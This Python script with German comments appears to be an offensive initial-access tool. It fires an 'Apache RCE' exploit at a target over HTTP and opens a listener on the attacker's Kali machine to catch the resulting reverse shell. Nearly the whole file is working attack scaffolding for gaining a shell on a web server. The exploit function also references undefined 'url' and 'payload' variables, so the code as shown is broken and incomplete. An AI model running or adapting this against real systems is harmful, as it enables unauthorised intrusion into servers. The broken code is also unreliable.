import socket
import threading
import requests
import time

def fire_exploit(target_url, lhost, lport):
    """Sendet den Apache RCE Exploit, während der Listener bereits wartet."""
    # Warten damit Socke-Listner sicher ready ist
    time.sleep(1)
    
        
    try:
        # Request vorbereiten das Python Pfad nicht auflöst
        req = requests.Request('POST', url, data=payload)
        prepared = req.prepare()
        prepared.url = url 
        
        s = requests.Session()
        # Timeout von 3 Sek ist wichtig, da die Reverse Shell den Request "hängen" lässt
        s.send(prepared, timeout=3)
    except requests.exceptions.ReadTimeout:
        pass
    except Exception as e:
        print(f"[-] Fehler beim Senden des Exploits: {e}")

def get_www_shell(target_ip, kali_ip, kali_port=4444):
    """
    Startet den Listener, sendet den Exploit und fängt die Shell.
    Gibt das Socket-Objekt (die Reverse Shell) zurück.
    """
    target_url = f"http://{target_ip}"
    
    # 1. Socket-Listener vorbereiten
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", kali_port))
    server.listen(1)
    print(f"[*] Initial Access Listener gestartet auf Port {kali_port}...")

    # 2. Exploit im Hintergrund senden 
    threading.Thread(target=fire_exploit, args=(target_url, kali_ip, kali_port)).start()

    # 3. Auf den Rückruf vom Apache warten (Blockierend)
    server.settimeout(15) # 15 Sekunden auf Erfolg warten
    try:
        www_shell, addr = server.accept()
        print(f"[+] Initial Access erfolgreich. Shell erhalten von {addr[0]}")
        return www_shell
    except socket.timeout:
        print("[-] Timeout - Keine Shell vom Apache erhalten.")
        return None
    finally:
        server.close() # Den Listener-Port wieder freigeben
